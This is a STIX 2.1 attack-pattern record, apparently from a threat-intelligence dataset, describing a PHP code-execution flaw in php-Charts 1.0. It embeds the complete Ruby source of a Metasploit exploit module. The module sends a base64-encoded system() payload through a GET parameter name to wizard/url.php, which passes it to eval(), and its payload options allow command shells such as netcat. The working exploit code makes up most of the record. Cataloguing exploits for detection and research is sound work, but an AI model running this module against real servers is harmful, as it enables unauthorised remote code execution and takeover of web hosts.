{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--b824fa3b-e2e0-4fdb-bcb9-52646c9eca0a",
    "created": "2024-08-14T17:13:11.937766Z",
    "modified": "2024-08-14T17:13:11.937769Z",
    "name": "\"PHP-Charts v1.0 PHP Code Execution Vulnerability\"",
    "description": " This module exploits a PHP code execution vulnerability in php-Charts version 1.0 which could be abused to allow users to execute arbitrary PHP code under the context of the webserver user. The 'url.php' script calls eval() with user controlled data from any HTTP GET parameter name.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/webapp/php_charts_exec.rb",
            "external_id": "php_charts_exec.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"PHP-Charts v1.0 PHP Code Execution Vulnerability\",\n      'Description'    => %q{\n        This module exploits a PHP code execution vulnerability in php-Charts\n        version 1.0 which could be abused to allow users to execute arbitrary\n        PHP code under the context of the webserver user. The 'url.php' script\n        calls eval() with user controlled data from any HTTP GET parameter name.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'AkaStep', # Discovery and PoC\n          'bcoles' # msf exploit\n        ],\n      'References'     =>\n        [\n          ['OSVDB', '89334'],\n          ['BID', '57448'],\n          ['EDB',   '24201']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\\x0a\\x0d\\x22\",\n          'Compat'      =>\n            {\n            'PayloadType' => 'cmd',\n            'RequiredCmd' => 'generic telnet netcat netcat-e perl ruby python',\n            }\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => 'thread'\n        },\n      'Platform'       => 'unix',\n      'Arch'           => ARCH_CMD,\n      'Targets'        =>\n        [\n          ['Automatic Targeting', { 'auto' => true }]\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2013-01-16',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('TARGETURI', [true, 'The path to the web application', '/php-charts_v1.0/']),\n      ])\n  end\n\n  def check\n\n    base  = target_uri.path\n    base << '/' if base[-1, 1] != '/'\n    peer  = \"#{rhost}:#{rport}\"\n    fingerprint = Rex::Text.rand_text_alphanumeric(rand(8)+4)\n    code  = Rex::Text.uri_encode(Rex::Text.encode_base64(\"echo #{fingerprint}\"))\n    rand_key_value = rand_text_alphanumeric(rand(10)+6)\n\n    # send check\n    print_status(\"Sending check\")\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri'    => \"#{base}wizard/url.php?${system(base64_decode(\\\"#{code}\\\"))}=#{rand_key_value}\"\n      })\n\n      if res and res.body =~ /#{fingerprint}/\n        return Exploit::CheckCode::Vulnerable\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n      vprint_error(\"Connection failed\")\n      return Exploit::CheckCode::Unknown\n    end\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n\n    base  = target_uri.path\n    base << '/' if base[-1, 1] != '/'\n\n    code  = Rex::Text.uri_encode(Rex::Text.encode_base64(payload.encoded+\"&\"))\n    rand_key_value = rand_text_alphanumeric(rand(10)+6)\n\n    # send payload\n    print_status(\"Sending payload (#{code.length} bytes)\")\n    begin\n      res = send_request_cgi({\n        'method' => 'GET',\n        'uri'    => \"#{base}wizard/url.php?${system(base64_decode(\\\"#{code}\\\"))}=#{rand_key_value}\"\n      })\n      if res and res.code == 500\n        print_good(\"Payload sent successfully\")\n      else\n        fail_with(Failure::UnexpectedReply, \"#{peer} - Sending payload failed\")\n      end\n    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout\n        fail_with(Failure::Unreachable, \"#{peer} - Connection failed\")\n    end\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-01-16",
    "x_mitre_platforms": [
        "unix'"
    ]
}